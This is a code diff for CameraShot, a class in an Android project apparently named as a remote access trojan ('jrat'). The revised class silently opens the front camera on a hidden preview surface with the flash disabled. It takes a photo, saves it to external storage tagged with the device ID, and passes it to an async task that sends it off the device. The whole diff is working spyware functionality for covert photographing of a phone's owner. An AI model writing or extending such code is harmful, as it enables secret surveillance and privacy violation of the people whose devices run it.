@@ -1,8 +1,11 @@
 package com.julioxus.jrat;
 
+import android.content.Context;
+import android.graphics.ImageFormat;
 import android.graphics.SurfaceTexture;
 import android.hardware.Camera;
 import android.os.Environment;
+import android.util.Log;
 
 import java.io.File;
 import java.io.FileNotFoundException;
@@ -14,58 +17,65 @@ import java.io.IOException;
  */
 public class CameraShot {
 
-    SurfaceTexture surfaceTexture ;
-    Camera myCamera;
-    String android_id;
-    String fileName;
+    private Camera myCamera;
+    private String android_id;
+    private String fileName;
+    private Context context;
 
 
-    public CameraShot(String android_id){
+    public CameraShot(Context context, String android_id){
+        this.context = context;
         this.android_id = android_id;
         myCamera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
-        surfaceTexture = new SurfaceTexture(10);
     }
 
-    private void takePhoto() {
+    public void takePhoto() {
 
-        Camera.Parameters parameters = myCamera.getParameters();
-        myCamera.setParameters(parameters);
         try {
-            myCamera.setPreviewTexture(surfaceTexture);
-            myCamera.startPreview();
-            myCamera.takePicture(null, null, photoCallback);
+            myCamera.setPreviewTexture(new SurfaceTexture(1000));
         } catch (IOException e) {
-            // TODO Auto-generated catch block
             e.printStackTrace();
         }
-    }
 
-    Camera.PictureCallback photoCallback=new Camera.PictureCallback() {
-        public void onPictureTaken(byte[] data, Camera camera) {
-            savePhoto(data);
-        }
-    };
+        Camera.Parameters parameters = myCamera.getParameters();
+        parameters.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
+        parameters.setPictureFormat(ImageFormat.JPEG);
+        myCamera.setParameters(parameters);
+
+        myCamera.startPreview();
+        myCamera.takePicture(null, null, null, new Camera.PictureCallback() {
+            @Override
+            public void onPictureTaken(byte[] data, Camera camera) {
+                savePhoto(data);
+            }
+        });
+
+        Log.d("CameraShot", "Tomando foto!");
+    }
 
     public void savePhoto(byte[] data){
         try {
-            String root = Environment.getExternalStorageDirectory().toString();
-            fileName = root + "/" +android_id+"photo.jpg";
+            fileName = Environment.getExternalStorageDirectory().getAbsolutePath();
+            fileName += "/" + android_id +"-CameraShot.jpg";
             File file = new File(fileName);
             FileOutputStream out = new FileOutputStream(file);
+
             out.write(data);
             out.flush();
             out.close();
+
+            new SendCameraShotAsyncTask(context, android_id, fileName).execute();
+
         } catch (FileNotFoundException e) {
             e.printStackTrace();
         } catch (IOException e){
             e.printStackTrace();
         } catch (Exception e){
             e.printStackTrace();
+        }finally {
+            myCamera.stopPreview();
+            myCamera.release();
+            myCamera = null;
         }
     }
-
-    public String getFileName() {
-        return fileName;
-    }
-
 }
